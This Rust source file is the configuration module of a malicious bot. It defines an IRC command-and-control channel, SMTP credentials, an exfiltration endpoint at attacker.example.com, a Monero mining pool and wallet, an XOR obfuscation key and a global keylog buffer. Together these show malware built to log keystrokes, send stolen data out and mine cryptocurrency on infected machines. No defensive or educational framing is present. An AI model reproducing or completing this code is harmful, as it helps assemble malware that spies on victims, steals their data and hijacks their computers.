use serde::{Deserialize, Serialize};
use lazy_static::lazy_static;
use std::sync::Mutex;

#[derive(Deserialize, Serialize, Debug, Clone)]
pub struct BotConfig {
    pub irc_server: String,
    pub irc_channel: String,
    pub irc_nick: String,
    pub smtp_server: String,
    pub smtp_user: String,
    pub smtp_pass: String,
    pub exfil_url: String,
    pub pool_url: String,
    pub wallet: String,
    pub xor_key: String,
}

impl Default for BotConfig {
    fn default() -> Self {
        Self {
            irc_server: "irc.example.com".to_string(),
            irc_channel: "#c2_channel".to_string(),
            irc_nick: "Hello-User".to_string(),
            smtp_server: "smtp.gmail.com".to_string(),
            smtp_user: "bot@gmail.com".to_string(),
            smtp_pass: "app_password_here".to_string(),
            exfil_url: "http://attacker.example.com/exfil".to_string(),
            pool_url: "pool.supportxmr.com:3333".to_string(),
            wallet: "your_monero_wallet_address_here".to_string(),
            xor_key: "PRODUCT_KEY_2025".to_string(),
        }
    }
}

pub async fn load_config() -> BotConfig {
    match tokio::fs::read_to_string("config.toml").await {
        Ok(content) => toml::from_str(&content).unwrap_or_default(),
        Err(_) => {
            // Create default config if not exists
            let default = BotConfig::default();
            let toml_str = toml::to_string(&default).unwrap();
            tokio::fs::write("config.toml", toml_str).await.ok();
            default
        }
    }
}

lazy_static! {
    pub static ref CONFIG: Mutex<Option<BotConfig>> = Mutex::new(None);
    pub static ref KEYLOGS: Mutex<String> = Mutex::new(String::new());
}